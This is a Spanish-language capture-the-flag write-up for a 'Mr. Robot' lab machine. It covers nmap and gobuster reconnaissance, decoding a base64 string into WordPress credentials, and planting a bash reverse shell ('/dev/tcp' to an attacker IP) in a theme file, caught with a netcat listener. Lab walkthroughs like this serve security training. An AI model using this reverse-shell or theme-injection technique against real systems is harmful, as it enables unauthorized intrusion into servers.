# Reto 5 - Mr. Robot
Herramientas utilizadas:
- nmap
- netcat
- cyberchef
- gobuster
- cewl
- hydra
- wget

Este reto consiste en aplicar técnicas de hacking para encontrar tres banderas en la máquina víctima. Luego de identificar el host procedemos a utilizar la herramienta ```nmap``` para determinar los servicios y versiones que corren por los puertos que tiene abiertos la máquina víctima.
```
nmap <ip_mv> -sCV -Pn -p-
```
```
Host is up (0.084s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn\'t have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
```
Podemos observar que encontramos tres puertos abiertos. Procedemos a revisar la web que se exporta por el puerto 80.

<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>

Utilizamos la herramienta ```gobuster``` para listar los directorios existentes en la web.

<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>

Listamos el contenido del fichero y encontramos la primera flag del reto

Primera flag: ```flag{073403c8a58a1f80d943455fb30724b9}```


Revisando otros directorios encontramos que en ```/license``` se mostraba un mensaje que parecía no muy relevante. Al observar al final de la web, nos mostraban una cadena en base64.

<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>

Decodificamos la cadena para llevarla a texto claro y obtenemos un posible usuario y contraseña.
```
echo "ZwxsaW90kVSMjgtMDY1Mgo=" | base64 -d
  elliot:ER28-0652
```
Accedemos al panel de login de Wordpress y probamos las credenciales encontradas.

<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>

Ya logueados nos aprovechamos del apartado **Appearance** para subir una **reverse shell** y ganar acceso a la máquina. Agregamos la línea de código siguiente:
```
bash -i >& /dev/tcp/10.8.144.236/4142 0>&1
```
Posteriormente nos ponemos en escucha en nuestra máquina local con ```netcat``` y accedemos al archivo donde se encuentra el código agregado para ganar acceso a la máquina víctima. ```URL:  http://10.32.2.48/wp-content/themes/twentyfifteen/archive.php```
```
nc -nlvp 4142
```

<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
